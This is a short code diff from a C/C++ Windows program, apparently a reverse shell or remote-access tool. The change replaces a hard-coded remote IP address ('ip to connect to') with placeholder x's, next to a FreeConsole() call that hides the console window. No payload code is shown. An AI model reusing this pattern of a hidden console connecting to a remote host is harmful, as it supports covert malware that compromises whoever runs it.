@@ -45,7 +45,7 @@ void CreateKey() {
 
 int main(int argc, char** argv) {
 	FreeConsole(); // This is the way to make the cmd vanish
-	char rhost[] = "51.75.30.35"; // ip to connect to
+	char rhost[] = "xxxxxxxxxxxxx"; // ip to connect to
 
 	int low_dist = 1000;
 	int high_dist = 2000;
